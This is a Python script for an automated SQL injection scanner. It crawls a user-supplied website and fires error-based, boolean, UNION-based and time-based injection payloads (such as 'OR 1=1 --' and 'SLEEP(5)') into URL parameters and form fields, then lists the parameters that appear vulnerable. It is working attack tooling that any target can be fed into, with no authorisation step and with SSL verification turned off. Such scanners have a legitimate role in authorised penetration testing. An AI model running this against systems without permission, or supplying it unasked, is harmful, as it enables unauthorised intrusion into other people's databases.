import aiohttp
import asyncio
import time
import difflib
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

MAX_PAGES = 10
CONCURRENT_REQUESTS = 3
TIME_THRESHOLD = 3
SIMILARITY_THRESHOLD = 0.85

semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR 1=1 --"]
BOOLEAN_PAYLOADS = [("' OR 1=1 --", "' OR 1=2 --")]
UNION_PAYLOADS = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
]
TIME_PAYLOADS = [
    "' OR SLEEP(5) --",
    "' OR pg_sleep(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
]

SQL_ERRORS = [
    "sql syntax", "mysql", "warning", "pdo", "sqlite",
    "postgresql", "unclosed quotation", "you have an error in your sql",
    "odbc", "ora-", "microsoft jet"
]


# ---------------- HELPERS ---------------- #

def clean_html(text):
    text = re.sub(r'\d+', '', text)
    text = re.sub(r'\s+', ' ', text)
    return text.strip().lower()


def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


def contains_sql_error(text):
    text = text.lower()
    return any(err in text for err in SQL_ERRORS)


async def request(session, url, method="get", params=None, data=None):
    async with semaphore:
        try:
            await asyncio.sleep(0.2)
            start = time.time()

            if method == "post":
                async with session.post(url, data=data, timeout=10) as r:
                    text = await r.text(errors="replace")
            else:
                async with session.get(url, params=params, timeout=10) as r:
                    text = await r.text(errors="replace")

            return clean_html(text), time.time() - start

        except:
            return "", 0


async def stable_request(session, url, method="get", params=None, data=None, repeats=3):
    responses = []
    times = []

    for _ in range(repeats):
        text, t = await request(session, url, method, params, data)
        responses.append(text)
        times.append(t)

    return max(responses, key=len), sum(times) / len(times)


# ---------------- CRAWLER ---------------- #

def normalize_netloc(url):
    return urlparse(url).netloc.replace("www.", "").lower()


def extract_links(base_url, html):
    soup = BeautifulSoup(html, "html.parser")
    links = set()

    for tag in soup.find_all("a", href=True):
        href = tag["href"].strip()

        if href.startswith(("javascript:", "mailto:", "#", "tel:")):
            continue

        full = urljoin(base_url, href).split("#")[0]
        links.add(full)

    return links


async def crawl(session, start_url):
    visited = set()
    queue = [start_url]
    base = normalize_netloc(start_url)

    while queue and len(visited) < MAX_PAGES:
        url = queue.pop(0)

        if url in visited:
            continue

        html, _ = await request(session, url)
        visited.add(url)

        for link in extract_links(url, html):
            if normalize_netloc(link) == base:
                queue.append(link)

    return visited


# ---------------- SQL TESTING ---------------- #

async def test_param(session, url, param, params, results):

    baseline, base_time = await stable_request(session, url, params=params)

    # ---------- ERROR BASED ----------
    for payload in ERROR_PAYLOADS:
        test = dict(params)
        test[param] = payload

        resp, _ = await request(session, url, params=test)

        if contains_sql_error(resp):
            results.append({
                "type": "Error-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload
            })

    # ---------- BOOLEAN BASED ----------
    for true_p, false_p in BOOLEAN_PAYLOADS:
        t_params = dict(params)
        f_params = dict(params)

        t_params[param] = true_p
        f_params[param] = false_p

        true_resp, _ = await stable_request(session, url, params=t_params)
        false_resp, _ = await stable_request(session, url, params=f_params)

        sim_tf = similarity(true_resp, false_resp)
        sim_tb = similarity(true_resp, baseline)
        sim_fb = similarity(false_resp, baseline)

        if sim_tf < SIMILARITY_THRESHOLD and sim_tb > sim_fb:
            results.append({
                "type": "Boolean-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": f"{true_p} | {false_p}",
                "similarity": round(sim_tf, 3)
            })

    # ---------- UNION BASED ----------
    for payload in UNION_PAYLOADS:
        test = dict(params)
        test[param] = payload

        resp, _ = await request(session, url, params=test)

        if similarity(resp, baseline) < SIMILARITY_THRESHOLD:
            results.append({
                "type": "UNION-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload
            })

    # ---------- TIME BASED ----------
    for payload in TIME_PAYLOADS:
        test = dict(params)
        test[param] = payload

        _, duration = await request(session, url, params=test)

        if duration - base_time > TIME_THRESHOLD:
            results.append({
                "type": "Time-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload,
                "delay": round(duration - base_time, 2)
            })


async def scan_url_params(session, url, results):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return

    flat = {k: v[0] for k, v in params.items()}

    tasks = []
    for param in flat:
        tasks.append(test_param(session, url, param, flat, results))

    await asyncio.gather(*tasks)


# ---------------- FORM SCANNING ---------------- #

def extract_forms(html):
    return BeautifulSoup(html, "html.parser").find_all("form")


def get_form_details(form):
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()

    inputs = []
    for tag in form.find_all(["input", "textarea", "select"]):
        name = tag.attrs.get("name")
        if name:
            inputs.append(name)

    return action, method, inputs


async def scan_forms(session, url, results):
    html, _ = await request(session, url)
    forms = extract_forms(html)

    for form in forms:
        action, method, inputs = get_form_details(form)
        target = urljoin(url, action) if action else url

        if not inputs:
            continue

        data = {i: "test" for i in inputs}
        baseline, _ = await stable_request(session, target, method, data=data)

        for payload in ERROR_PAYLOADS:
            test_data = {i: payload for i in inputs}

            if method == "post":
                resp, _ = await request(session, target, method="post", data=test_data)
            else:
                resp, _ = await request(session, target, params=test_data)

            if contains_sql_error(resp) or similarity(resp, baseline) < SIMILARITY_THRESHOLD:
                results.append({
                    "type": "Form SQLi",
                    "url": target,
                    "method": method.upper(),
                    "inputs": inputs,
                    "payload": payload
                })


# ---------------- MAIN ---------------- #

def deduplicate(results):
    seen = set()
    unique = []

    for r in results:
        key = (r.get("type"), r.get("url"), r.get("parameter"), r.get("payload"))
        if key not in seen:
            seen.add(key)
            unique.append(r)

    return unique


async def scan(start_url):
    results = []

    headers = {"User-Agent": "AdvancedSQLiScanner"}
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        pages = await crawl(session, start_url)

        tasks = []
        for page in pages:
            tasks.append(scan_url_params(session, page, results))
            tasks.append(scan_forms(session, page, results))

        await asyncio.gather(*tasks)

    return deduplicate(results)


if __name__ == "__main__":
    target = input("Enter target URL: ").strip()

    if not target.startswith("http"):
        target = "http://" + target

    findings = asyncio.run(scan(target))

    print("\nSQL Injection Scan Results")
    print("=" * 60)

    if findings:
        for i, f in enumerate(findings, 1):
            print(f"\n[{i}] {f['type']}")
            print(f"URL: {f['url']}")

            if "parameter" in f:
                print(f"Parameter: {f['parameter']}")

            if "payload" in f:
                print(f"Payload: {f['payload']}")

            if "similarity" in f:
                print(f"Similarity: {f['similarity']}")

            if "delay" in f:
                print(f"Delay: {f['delay']}s")
    else:
        print("\nNo SQL injection indicators detected.")
